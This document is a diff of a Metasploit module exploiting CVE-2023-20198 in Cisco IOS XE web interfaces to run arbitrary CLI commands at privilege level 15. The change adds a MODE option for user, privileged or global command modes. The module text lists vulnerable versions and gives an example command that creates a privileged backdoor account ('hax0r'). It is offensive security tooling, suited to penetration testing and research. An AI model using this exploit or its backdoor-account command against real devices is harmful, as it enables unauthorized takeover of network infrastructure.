@@ -17,12 +17,11 @@ class MetasploitModule < Msf::Auxiliary
           This module leverages CVE-2023-20198 against vulnerable instances of Cisco IOS XE devices which have the
           Web UI exposed. An attacker can execute arbitrary CLI commands with privilege level 15.
 
-          By default [CLI commands](https://www.cisco.com/E-Learning/bulk/public/tac/cim/cib/using_cisco_ios_software/02_cisco_ios_hierarchy.htm)
-          are run in the Global configuration mode. To drop down to Privileged EXEC mode, you can preface your command
-          with the `exit` keyword followed by an (escaped) newline, e.g. To run the command `show version` in Privileged
-          EXEC mode, the CMD must be `exit\nshow version`. To drop to User EXEC mode you can preface your command with
-          two `exit` keywords, e.g. `exit\nexit\nshow ip interface brief`. To run a command in Global configuration
-          mode, just set the `CMD` option to the command you want to run, e.g. `username hax0r privilege 15 password hax0r`.
+          You must specify the IOS command mode to execute a CLI command in. Valid modes are `user`, `privileged`, and
+          `global`. To run a command in "Privileged" mode, set the `CMD` option to the command you want to run,
+          e.g. `show version` and set the `MODE` to `privileged`.  To run a command in "Global Configuration" mode, set
+          the `CMD` option to the command you want to run,  e.g. `username hax0r privilege 15 password hax0r` and set
+          the `MODE` to `global`.
 
           The vulnerable IOS XE versions are:
           16.1.1, 16.1.2, 16.1.3, 16.2.1, 16.2.2, 16.3.1, 16.3.2, 16.3.3, 16.3.1a, 16.3.4,
@@ -78,19 +77,30 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('CMD', [ true, 'The Global configuration CLI command to execute. To drop to Privileged EXEC mode, preface your CMD with exit\\\\n, e.g "exit\\\\nshow version"', 'exit\\nshow version'])
+        OptString.new('CMD', [ true, 'The CLI command to execute.', 'show version']),
+        OptString.new('MODE', [ true, "The mode to execute the CLI command in, valid values are 'user', 'privileged', or 'global'.", Mode::PRIVILEGED_EXEC])
       ]
     )
   end
 
   def run
+    # We convert escaped newlines into actual newlines, as the Cisco CLI will allow you to navigate from an upper mode
+    # (e.g. Global) down to a lower mode (e.g. Privileged or User) via the "exit" command. We explicitly let a user
+    # specify the mode to execute their CMD in, via the MODE option, however we must still support the user specifying
+    # newlines as they may want to execute multiple commands (or manually navigate the difference modes).
     cmd = datastore['CMD'].gsub('\\n', "\n")
     if cmd.empty?
       print_error('Command can not be empty.')
       return
     end
 
-    result = run_cli_command(cmd)
+    mode = Mode.to_mode(datastore['MODE'].to_s.downcase)
+    if mode.nil?
+      print_error("Invalid mode specified, valid values are 'user', 'privileged', or 'global'")
+      return
+    end
+
+    result = run_cli_command(cmd, mode)
     if result.nil?
       print_error('Failed to run the command.')
       return
